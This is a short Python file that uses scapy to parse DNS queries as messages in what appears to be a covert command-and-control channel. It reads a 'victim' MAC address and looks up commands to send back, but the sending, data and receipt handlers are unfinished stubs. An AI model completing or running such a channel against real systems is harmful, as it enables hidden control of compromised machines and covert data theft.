"""Process a given packet
"""
from scapy.all import *
from utils.request_type import *

from command.cmdparser import CommandParser

class DataReceiver():

    def __init__(self, cmd_file):
        self.cmd_parser = CommandParser()
        self.cmd_file = cmd_file

    def parse(self, pkt):
        # Check qtype field to delineate type of given packet
        if pkt.getlayer(DNSQR).qtype == PING:
            self._receive_ping(pkt)
        elif pkt.getlayer(DNSQR).qtype == DATA:
            self._receive_data(pkt)
        elif pkt.getlayer(DNSQR).qtype == RECPT:
            self._receive_recpt(pkt)

    def _receive_ping(self, pkt):
        # Fetch given command that should be sent to the client
        victim_mac = pkt.getlayer(Ether).src
        pkts = self.cmd_parser.parse(victim_mac, self.cmd_file)

        # Send packets back to victim

    def _receive_data(self, pkt):
        pass

    def _receive_recpt(self, pkt):
        pass